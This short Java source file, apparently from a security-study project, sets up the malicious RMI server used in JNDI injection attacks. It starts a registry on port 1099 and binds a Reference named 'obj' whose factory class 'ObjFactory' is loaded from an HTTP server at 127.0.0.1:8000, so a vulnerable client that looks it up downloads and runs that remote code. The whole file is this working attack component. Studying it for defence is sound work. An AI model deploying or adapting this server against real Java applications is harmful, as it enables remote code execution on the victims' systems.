package run.ergou.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIWithReference {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        // 创建指向可控FactoryLocation的Reference对象
        Reference objRef = new Reference("Obj", "ObjFactory", "http://127.0.0.1:8000/");
        ReferenceWrapper refWrapper = new ReferenceWrapper(objRef);

        Naming.bind("obj", refWrapper);
    }
}